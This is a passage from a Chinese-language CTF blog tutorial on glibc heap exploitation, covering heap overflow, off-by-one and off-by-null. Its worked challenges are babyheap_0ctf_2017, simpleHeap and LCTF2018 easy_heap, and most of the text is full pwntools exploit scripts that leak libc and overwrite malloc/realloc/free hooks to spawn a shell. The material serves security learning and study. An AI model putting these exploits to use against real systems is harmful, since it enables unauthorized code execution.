class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leaveYourName</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;your name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        new(i, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># chunk 15 to prevent consolidate forward, so that we can get a smallbin chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># malloc_consolidate() to get a smallbin chunk, leak libc addr</span></span><br><span class="line">    leaveYourName(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    dump(<span class="number">7</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">336</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;Libc addr:&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#tcache poisoning</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(i, <span class="number">0x10</span>)</span><br><span class="line">    new(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite __free_hook</span></span><br><span class="line">    new(<span class="number">10</span>, <span class="number">0x10</span>)</span><br><span class="line">    new(<span class="number">9</span>, <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">9</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即得flag</p>
<p><img src="https://i.loli.net/2021/01/20/NFqcz781vACTKPB.png" alt="image.png"></p>
<h2 id="四、堆溢出"><a href="#四、堆溢出" class="headerlink" title="四、堆溢出"></a>四、堆溢出</h2><p>堆溢出通常指的是在程序读取输入到堆块上时，未经严格的检测（如使用<code>gets()</code>读入），导致用户输入的数据可以溢出到其物理相邻高地址的chunk，从而改写其结构，予攻击者以无限的利用空间</p>
<h4 id="例题：babyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><a href="#例题：babyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget" class="headerlink" title="例题：babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget"></a>例题：babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget</h4><blockquote>
<p>似乎是比较经典的堆溢出入门题……？</p>
</blockquote>
<p>惯例的<code>checksec</code>，保护全开</p>
<p><img src="https://i.loli.net/2020/09/21/aZJExgI4UqDuPoj.png" alt="image.png"></p>
<p>拖入IDA里进行分析（以下部分函数、变量名经过重命名）</p>
<p>常见的堆题基本上都是菜单题，本题也不例外<img src="https://i.loli.net/2020/09/30/VEjFKYhibtqHfs6.png" alt="image.png"></p>
<p>我们可以发现在<code>writeHeap()</code>函数中并没有对我们输入的长度进行检查，<strong>存在堆溢出</strong></p>
<p><img src="https://i.loli.net/2020/09/30/WAOCpdZMVRlSxgm.png" alt="image.png"></p>
<p>故我们考虑先创建几个小堆块，再创建一个大堆块，free掉两个小堆块进入到fastbin，用堆溢出改写fastbin第一个块的fd指针为我们所申请的大堆块的地址，需要注意的是fastbin会对chunk的size进行检查，故我们还需要先通过堆溢出改写大堆块的size，之后将大堆块分配回来后我们就有两个指针指向同一个堆块</p>
<p><img src="https://i.loli.net/2020/10/07/XARM5QmBzFadtWi.png" alt="62DB8B2E56B87418664EEB947A980782.png"></p>
<p>利用堆溢出将大堆块的size重新改大再free以送入unsorted bin，此时大堆块的fd与bk指针指向main_arena+0x58的位置，利用另外一个指向该大堆块的指针输出fd的内容即可得到main_arena+0x58的地址，就可以算出libc的基址</p>
<p><img src="https://i.loli.net/2020/10/07/IBAZ6ChTOrQwonp.png" alt="72934A2F942430E796048F09C96A261F.png"></p>
<p>接下来便是fastbin attack：将某个堆块送入fastbin后改写其fd指针为__malloc_hook的地址（__malloc_hook位于main_arena上方0x10字节处），再将该堆块分配回来，此时fastbin中该链表上就会存在一个我们所伪造的位于__malloc_hook上的堆块，申请这个堆块后我们便可以改写malloc_hook上的内容为后门函数地址，最后随便分配一个堆块便可getshell</p>
<p>考虑到题目中并不存在可以直接getshell的后门函数，故考虑使用one_gadget以getshell</p>
<p><img src="https://i.loli.net/2020/10/07/glLRkSdY3GufeOv.png" alt="D2D612904D8AB28F1DCCE651D4B81508.png"></p>
<p>需要注意的是fastbin存在size检查，故在这里我们选择在__malloc_hook - 0x23的位置构造fake chunk（size字段为0x7f刚好能够通过malloc(0x60)的size检查）</p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27143</span>)<span class="comment">#process(&#x27;./babyheap_0ctf_2017&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index:<span class="built_in">int</span>,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本即可get shell</p>
<p><img src="https://i.loli.net/2020/10/07/9n7EyWL5OC3aIcm.png" alt="image.png"></p>
<h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h3><p>off by one 通常指的是对于堆块的读写存在一个字节的溢出，利用这一个字节的溢出我们通常可以溢出到一个chunk物理相邻高地址 chunk 的 size 域，篡改其 size 域以便后续的利用（如构造 overlapping 等）</p>
<h4 id="例题：-V-amp-N2020-公开赛-simpleHeap-off-by-one-fastbin-attack-one-gadget"><a href="#例题：-V-amp-N2020-公开赛-simpleHeap-off-by-one-fastbin-attack-one-gadget" class="headerlink" title="例题：[V&amp;N2020 公开赛]simpleHeap - off by one + fastbin attack + one_gadget"></a>例题：[V&amp;N2020 公开赛]simpleHeap - off by one + fastbin attack + one_gadget</h4><p>又是一道堆题来了，不出所料，保  护  全  开</p>
<p><img src="https://i.loli.net/2020/12/01/iyIftbNOM4CrTka.png" alt="image.png"></p>
<p>同时题目提示 Ubuntu16 ，也就是说没有 tcache</p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/01/IWHrRozGqyLDfUX.png" alt="image.png"></p>
<p>这是一道有着分配、打印、释放、编辑堆块的功能的堆题，不难看出我们只能分配10个堆块，不过没有tcache的情况下，空间其实还是挺充足的                                                                                                                   </p>
<p>漏洞点在edit函数中，<strong>会多读入一个字节，存在off by one漏洞</strong>，利用这个漏洞我们可以<strong>修改一个堆块的物理相邻的下一个堆块的size</strong></p>
<p><img src="https://i.loli.net/2020/12/01/o9PlK4ECbHuFiN6.png" alt="image.png"></p>
<p>由于题目本身仅允许分配大小小于111的 chunk，而进入 unsorted bin 需要 malloc(0x80) 的 chunk ，故我们还是考虑利用 off by one 的漏洞改大一个 chunk 的 size 送入 unsorted bin 后分割造成 overlapping 的方式获得 libc 的地址</p>
<p><img src="https://i.loli.net/2020/12/03/mh1HLy7cvGrCUAQ.png" alt="image.png"></p>
<p>因为刚好 fastbin attack 所用的 chunk 的 size 为 0x71 ，故我们将这个大 chunk 的 size 改为 <code> 0x70 + 0x70 + 1 = 0xe1</code>即可</p>
<p>传统思路是将 __malloc_hook 改为 one_gadget 以 getshell，但是直接尝试我们会发现根本无法 getshell</p>
<p><img src="https://i.loli.net/2020/12/03/RXyTELuGiqKCSh7.png" alt="image.png"></p>
<p>这是因为one_gadget并非任何时候都是通用的，都有一定的先决条件，而当前的环境刚好不满足one_gadget的环境</p>
<p><img src="https://i.loli.net/2020/12/03/DlinxIM76eTLu8S.png" alt="image.png"></p>
<p>那么这里我们可以尝试使用 realloc 函数中的gadget来进行压栈等操作来满足 one_gadget 的要求，该段 gadget 执行完毕后会跳转至 __realloc_hook（若不为 NULL ）</p>
<p><img src="https://i.loli.net/2020/12/03/PNyq3WFTU8mtYSM.png" alt="image.png"></p>
<p>而 __realloc_hook 和 __malloc_hook 刚好是挨着的，我们在 fastbin attack 时可以一并修改</p>
<p><img src="https://i.loli.net/2020/12/03/AG3oW65aVeCzMgt.png" alt="image.png"></p>
<p>故考虑修改 __malloc_hook 跳转至 realloc 函数开头的 gadget 调整堆栈，修改 __realloc_hook 为 one_gadget 即可 getshell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28978</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># initialize chunk</span></span><br><span class="line">    new(<span class="number">0x18</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 3, prevent the top chunk consolidation</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># off by one get the unsorted bin chunk</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + <span class="string">b&#x27;\xe1&#x27;</span>) <span class="comment"># 0x70 + 0x70 + 1</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">    log.success(<span class="string">&quot;libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overlapping and fastbin double free</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4, overlapping with idx 2</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake chunk overwrite __realloc_hook</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + <span class="number">0x10</span>)) <span class="comment"># idx 5, our fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2020/12/03/5hSCU9J7GdHwvWK.png" alt="image.png"></p>
<h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p>off by null则是off by one的一种特殊形式，即仅溢出一个<code>&#39;\0&#39;</code>字节，通常出现于读入字符串时设计逻辑失误的情况（例如使用了 strcpy 或者是手动在末尾加 \0 等）</p>
<p>比起off by one，该种漏洞限制了溢出的一个字节为<code>&#39;\0&#39;</code>，极大地限制了我们的利用，但我们的修改仍能够达到一定的效果</p>
<h4 id="例题：LCTF2018-easy-heap-off-by-null-chunk-overlapping-Unsorted-bin-Leak-one-gadget"><a href="#例题：LCTF2018-easy-heap-off-by-null-chunk-overlapping-Unsorted-bin-Leak-one-gadget" class="headerlink" title="例题：LCTF2018 - easy_heap - off by null + chunk overlapping + Unsorted bin Leak + one_gadget"></a>例题：LCTF2018 - easy_heap - off by null + chunk overlapping + Unsorted bin Leak + one_gadget</h4><p><a href="/download/lctf2018/easy_heap">点击下载-easy_heap</a></p>
<p><a href="/download/lctf2018/libc64.so">点击下载-libc64.so</a></p>
<p>惯例的<code>checksec</code>分析，保护全开</p>
<p><img src="https://i.loli.net/2020/11/16/W2j7nlNHPq5rM9x.png" alt="image.png"></p>
<p>拖入IDA进行分析（部分函数及变量经过重命名</p>
<p><img src="https://i.loli.net/2020/11/16/jIc81hvM6mXdEa5.png" alt="image.png"></p>
<p>果不其然，传统的CTF签到题都是菜单堆题，LCTF2018也不例外</p>
<p>我们可以看到程序本身<strong>仅会分配大小为</strong><code>0xF8</code>的堆块</p>
<p><img src="https://i.loli.net/2020/11/16/a9BSzldOX1gGQR3.png" alt="image.png"></p>
<p>同时本题只允许我们分配10个堆块，在需要用7个来填满tcache的前提下， 可用空间属实有一丶丶紧张</p>
<p><img src="https://i.loli.net/2020/11/16/WjvhU3xuMOHtXE8.png" alt="image.png"></p>
<p>漏洞点存在于读入输入时，会将当前chunk的*(ptr + size)置0</p>
<p><img src="https://i.loli.net/2020/11/16/4cAr58VdzIm3us2.png" alt="image.png"></p>
<p>我们不难想到，若是我们输入的size为<code>0xf8</code>，则有机会将下一个<strong>物理相邻chunk的PREV_INUSE域覆盖为0</strong>，即<strong>存在off by null漏洞</strong></p>
<blockquote>
<p>248 &#x3D; 16*15 + 8</p>
</blockquote>
<p>通过off by null漏洞我们便可以实现堆块的重叠（overlap）：在tcache有六个chunk、我们手上有地址连续的三个chunk：A、B、C的情况下，先free掉B，送入tcache中保护起来，free掉A送入tcache，再malloc回B，<strong>覆写C的PREV_IN_USE为0，之后free掉C，触发malloc_consolidate，合并成为一个0x300的大chunk</strong>，实现<strong>overlapping</strong></p>
<p>之后倒空tcache，再分配一个chunk，便会分割unsorted bin里的大chunk，此时unsorted bin里的chunk与此前的chunk B重叠，<strong>输出chunk B的内容便能获得libc基址</strong></p>
<p>再分配一个chunk以得到指向相同位置上的堆块的索引，<strong>在这里构造tcache poisoning覆写__malloc_hook为one_gadget后随便分配一个chunk即可getshell</strong></p>
<p>需要注意的是在释放堆块的功能函数中在free前会先清空堆块内容，故在这里无法通过修改__free_hook为system后free(“&#x2F;bin&#x2F;sh”)的方法来getshell，因此笔者只好选择攻击__malloc_hook</p>
<p><img src="https://i.loli.net/2021/01/20/Za2wEpFAUu4mN7Q.png" alt="image.png"></p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 